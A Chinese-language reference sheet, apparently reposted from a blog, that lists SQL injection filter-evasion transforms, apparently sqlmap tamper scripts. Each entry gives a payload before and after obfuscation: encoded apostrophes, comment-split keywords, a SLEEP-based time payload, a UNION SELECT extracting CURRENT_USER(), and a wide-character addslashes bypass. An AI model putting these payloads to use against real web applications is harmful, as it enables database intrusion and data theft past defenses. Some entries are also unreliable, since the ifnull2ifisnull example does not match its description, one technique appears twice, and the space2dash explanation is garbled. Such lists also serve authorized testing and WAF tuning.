apostrophemask

将 SQL 语句中的撇号进行 UTF 编码。

Example:
* Input: AND '1'='1'
* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87

apostrophenullencode

将 SQL 语句中的撇号进行 Unicode 编码。

Example:
* Input: AND '1'='1'
* Output: AND %00%271%00%27=%00%271%00%27

appendnullbyte

在有效负荷末尾追加编码的空字节字符。

Example:
* Input: AND 1=1
* Output: AND 1=1%00
Requirement:
* Microsoft Access


base64encode

将用于攻击的有效载荷进行 base64 加密。

Example:
* Input: 1' AND SLEEP(5)#
* Output: MScgQU5EIFNMRUVQKDUpIw==


between

替换大于号。

Example:
* Input: 'A > B'
* Output: 'A NOT BETWEEN 0 AND B'


bluecoat

以随机的空白字符替代空格，以 like 替代 =。

Example:
* Input: SELECT id FROM users where id = 1
* Output: SELECT%09id FROM users where id LIKE 1
Requirement:
* MySQL 5.1, SGOS


chardoubleencode

双重 URL 编码。

Example:
* Input: SELECT FIELD FROM%20TABLE
* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545


charencode

URL 编码。

Example:
* Input: SELECT FIELD FROM%20TABLE
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45


charunicodeencode

对未进行url编码的字符进行unicode编码。

Example:
* Input: SELECT FIELD%20FROM TABLE
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
Requirement:
* ASP
* ASP.NET


equaltolike

以 like 替代 =。

Example:
* Input: SELECT * FROM users WHERE id=1
* Output: SELECT * FROM users WHERE id LIKE 1

space2dash

绕过过滤 = 替换空格字符。

– 后跟一个破折号注释、一个随机字符串和一个新行。

Example:
* Input: '1 AND 9227=9227'
* Output: '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'


greatest

用 GREATEST 函数替换大于号。

Example:
* Input: '1 AND A > B'
* Output: '1 AND GREATEST(A,B+1)=A' Tested against: * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0



space2hash

空格替换为井号、随机字符串或换行符。

Example:
* Input: '1 AND 9227=9227'
* Output: '1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227'


halfversionedmorekeywords

围绕每个 SQL 关键字添加注释。

Example:
* Input: "value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa"
* Output: "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"



space2morehash

空格替换为井号、换行符、以及更多随机字符串。

Example:
* Input: '1 AND 9227=9227'
* Output: '1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227'


ifnull2ifisnull

绕过对 IFNULL 过滤。

Example:
* Input: 'SELECT id FROM users'
* Output:  'SELECT%A0id%0BFROM%0Cusers'


space2plus

用加号替换空格（很可能被阻拦）。

Example:
* Input: 'SELECT id FROM users'
* Output:  'SELECT+id+FROM+users'


nonrecursivereplacement

双重查询语句。

Example:
* Input: '1 UNION SELECT 2--'
* Output: '1 UNIOUNIONN SELESELECTCT 2--'


space2randomblank

从有效空白符号字符集中选出并替换空格。

Example:
* Input: 'SELECT id FROM users'
* Output:  'SELECT%0Did%0DFROM%0Ausers'


sp_password

追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾。

Example:
* Intput:  '1 AND 9227=9227-- '
* Output: '1 AND 9227=9227-- sp_password'
Requierment:
* Not Oracle


randomcase

随机大小写。

Example:
* Input: 'INSERT'
* Output:  'INseRt'


unmagicquotes

宽字符绕过 GPC addslashes。

Example:
* Input: "1' AND 1=1"
* Output:  '1%bf%27-- '


randomcomments

用 /*...*/ 分割 SQL 关键字。

* Input: 'INSERT'
* Output:  'I/**/N/**/SERT'


halfversionedmorekeywords

关键字前加注释。

* Input: "value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa"
* Output: "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"


本文转自 http://www.chuhades.com/post/19590b_4cc51f
